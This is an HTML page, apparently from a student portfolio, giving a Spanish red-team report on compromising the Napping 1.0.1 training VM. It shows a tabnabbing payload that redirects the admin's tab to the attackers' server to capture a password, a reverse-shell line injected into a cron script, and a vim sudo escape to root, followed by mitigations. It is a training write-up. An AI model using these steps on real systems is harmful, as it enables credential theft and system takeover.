@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alan | Actividad 11</title>
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <!-- Styles -->
+    <link rel="stylesheet" href="../assets/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+
+<body>
+
+    <header>
+        <div class="nav-container">
+            <div class="logo">
+                <span class="prompt-user">root</span><span class="prompt-host">@alan</span>:<span
+                    class="prompt-path">~/actividades/act11</span>$ <span class="cursor"></span>
+            </div>
+            <nav>
+                <ul class="nav-links">
+                    <li><a href="../index.html" class="nav-link">/inicio</a></li>
+                    <li><a href="../actividades.html" class="nav-link active">/actividades</a></li>
+                    <li><a href="../proyectos.html" class="nav-link">/proyectos</a></li>
+                    <li><a href="../certificaciones.html" class="nav-link">/certificaciones</a></li>
+                    <li><a href="../pf01.html" class="nav-link">/PF01</a></li>
+                    <li><a href="../pf02.html" class="nav-link">/PF02</a></li>
+                    <li><a href="../pf03.html" class="nav-link">/PF03</a></li>
+                    <li class="nav-item-dropdown">
+                        <a href="../RoadToHallOfFame/sql_injection.html" class="nav-link nav-hof">/road_to_hall_of_fame</a>
+                        <ul class="dropdown-menu">
+                            <li><a href="../RoadToHallOfFame/sql_injection.html">SQL Injection</a></li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="../actividades.html" class="btn-back">&lt; Volver</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <article class="blog-container section-scroll">
+
+            <div style="height: 250px; display: block;" aria-hidden="true" class="layout-spacer"></div>
+
+            <header class="article-header">
+                <h1 style="margin-top: 8rem; margin-bottom: 3rem; line-height: 1.4; display: block; padding-top: 2rem;">
+                    ACTIVIDAD 11: Red Team Report – Pentesting de la Máquina Napping 1.0.1</h1>
+                <div class="meta-info">
+                    <span><i class="far fa-calendar"></i> Abril 2026</span>
+                    <span><i class="far fa-user"></i> Equipo 4</span>
+                </div>
+                <div class="team-members"
+                     style="margin-top: 2rem; color: var(--text-muted); font-family: var(--font-mono); font-size: 0.9rem;">
+                    <p>Integrantes:</p>
+                    <ul style="list-style: none; padding: 0;">
+                        <li>Alonso Castillo Omar Karim (179033)</li>
+                        <li>Cruz Juárez Francisco Javier (177622)</li>
+                        <li>Espinoza Aguilar Brian Salvador (175031)</li>
+                        <li>Martínez Lara Santiago de la Cruz (177685)</li>
+                        <li>Sánchez Ramírez Mayeli (173030)</li>
+                        <li>Sánchez Zavala Alan Gilberto (177263)</li>
+                    </ul>
+                </div>
+            </header>
+
+            <hr class="neon-divider">
+
+            <div class="article-body">
+
+                <section>
+                    <h2>Resumen Ejecutivo</h2>
+                    <p>
+                        Este reporte describe el proceso completo de auditoría y compromiso de la máquina virtual de entrenamiento <strong>Napping 1.0.1</strong>. La intrusión progresó desde el descubrimiento inicial de hosts mediante ARP, la explotación de una vulnerabilidad de <strong>Tabnabbing</strong> en el portal web corporativo para secuestrar las credenciales del administrador, y finalmente la escalada de privilegios a root abusando de un script Python programado en cron y de permisos mal configurados en sudoers (Vim).
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Metodología Técnica Aplicada</h2>
+                    <h3>1. Reconocimiento y Descubrimiento</h3>
+                    <p>
+                        Utilizando la herramienta <code>netdiscover</code>, se identificó al host objetivo con la IP <code>192.168.56.103</code>. Posteriormente, un escaneo con Nmap (<code>nmap -A 192.168.56.103</code>) reveló dos puertos abiertos:
+                    </p>
+                    <ul class="tech-list" style="margin-left: 1.5rem;">
+                        <li><strong>Puerto 22 (SSH):</strong> OpenSSH 8.2p1.</li>
+                        <li><strong>Puerto 80 (HTTP):</strong> Servidor web Apache 2.4.41.</li>
+                    </ul>
+                    <p>
+                        Se identificó además la ausencia del atributo <code>HttpOnly</code> en las cookies de sesión (PHPSESSID), y mediante <code>DirBuster</code> se mapearon rutas sensibles como <code>register.php</code>, <code>index.php</code> y <code>welcome.php</code>.
+                    </p>
+
+                    <h3>2. Compromiso Inicial (Tabnabbing)</h3>
+                    <p>
+                        Al registrar un usuario y acceder a <code>welcome.php</code>, se encontró un formulario para enviar enlaces. Al no existir restricciones, se descubrió la exposición a <strong>Tabnabbing / Tab Hijacking</strong>. Se inyectó un payload en HTML (<code>payload.html</code>) que utilizaba:
+                    </p>
+                    <pre style="background: rgba(19, 20, 31, 0.6); border: 1px solid var(--border-color); padding: 1rem; border-radius: 8px; font-family: var(--font-mono); color: var(--accent-cyan); overflow-x: auto; margin-top: 0.5rem; margin-bottom: 0.5rem;"><code>window.opener.parent.location.replace('http://192.168.56.101:8000/home.html');</code></pre>
+                    <p>
+                        Tras simular la revisión por parte del administrador (daniel), la pestaña original de daniel se redirigió a nuestro servidor malicioso, capturando su contraseña: <code>C@ughtm3napping123</code>. Con estas credenciales se estableció conexión vía SSH.
+                    </p>
+
+                    <h3>3. Escalada de Privilegios</h3>
+                    <p>
+                        <strong>Movimiento Lateral (adrian):</strong> Se localizó un script de monitoreo en <code>/home/adrian/query.py</code> ejecutado periódicamente como tarea cron. Dado que el grupo al que pertenecía daniel poseía permisos de escritura sobre este script, se inyectó una reverse shell en Python:
+                    </p>
+                    <pre style="background: rgba(19, 20, 31, 0.6); border: 1px solid var(--border-color); padding: 1rem; border-radius: 8px; font-family: var(--font-mono); color: var(--accent-cyan); overflow-x: auto; margin-top: 0.5rem; margin-bottom: 0.5rem;"><code>os.system('/usr/bin/bash /dev/shm/connection.sh')</code></pre>
+                    <p>
+                        Esto devolvió una consola como el usuario <code>adrian</code>.
+                    </p>
+                    <p>
+                        <strong>Escalada a Root:</strong> Al auditar privilegios con <code>sudo -l</code>, se determinó que <code>adrian</code> tenía permiso de ejecutar <code>/usr/bin/vim</code> como root sin contraseña. Se abusó de esta directiva de escape (de acuerdo con GTFOBins) ejecutando:
+                    </p>
+                    <pre style="background: rgba(19, 20, 31, 0.6); border: 1px solid var(--border-color); padding: 1rem; border-radius: 8px; font-family: var(--font-mono); color: var(--accent-cyan); overflow-x: auto; margin-top: 0.5rem; margin-bottom: 0.5rem;"><code>sudo /usr/bin/vim -c ':!/bin/sh'</code></pre>
+                    <p>obteniendo control total (root) del sistema.</p>
+                </section>
+
+                <section>
+                    <h2>Tabla de Hallazgos Críticos</h2>
+                    <div class="table-container">
+                        <table class="cyber-table">
+                            <thead>
+                                <tr>
+                                    <th>ID Hallazgo</th>
+                                    <th>Vulnerabilidad</th>
+                                    <th>Severidad</th>
+                                    <th>Impacto</th>
+                                    <th>Mitigación Recomendada</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>VULN-01</strong></td>
+                                    <td>Tabnabbing en procesamiento de enlaces</td>
+                                    <td class="text-accent" style="color: #ff3e3e;">Alta</td>
+                                    <td>Robo de credenciales de administrador mediante redirección forzada.</td>
+                                    <td>Aplicar <code>rel="noopener noreferrer"</code> en enlaces que usen <code>target="_blank"</code>.</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>VULN-02</strong></td>
+                                    <td>Permiso de escritura en script ejecutado en Cron</td>
+                                    <td class="text-accent" style="color: #ff3e3e;">Alta</td>
+                                    <td>Inyección de código local y escalada horizontal.</td>
+                                    <td>Restringir la modificación de scripts automatizados al propietario absoluto (chmod 700/755).</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>VULN-03</strong></td>
+                                    <td>Bypass de Sudoers vía Vim interactivo</td>
+                                    <td class="text-accent" style="color: #ff3e3e;">Crítica</td>
+                                    <td>Escalada total de privilegios a root sin contraseña.</td>
+                                    <td>Eliminar la regla <code>NOPASSWD</code> para editores de texto interactivos en <code>/etc/sudoers</code>.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Conclusión</h2>
+                    <div class="quotation-box">
+                        <p>
+                            El incidente demuestra que fallos aislados que a priori no parecen críticos (como un redireccionamiento de ventana o permisos de grupo mal calculados) pueden encadenarse de manera devastadora. La remediación definitiva requiere un enfoque de defensa en profundidad: mitigar la entrada web, endurecer los permisos del sistema de archivos local y aplicar controles estrictos sobre la ejecución delegada (sudoers).
+                        </p>
+                    </div>
+                </section>
+
+            </div>
+
+            <div class="export-section">
+                <a href="../PDFs/act11-Equipo4.pdf" target="_blank" class="btn download-btn">
+                    <i class="fas fa-file-pdf"></i> Exportar a PDF
+                </a>
+                <p class="crypto-text">SHA256: d9d7a22b9fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b75f8f</p>
+            </div>
+
+        </article>
+    </main>
+
+    <footer>
+        <p>&copy; 2026 Alan Gilberto Sánchez Zavala</p>
+    </footer>
+
+</body>
+
+</html>
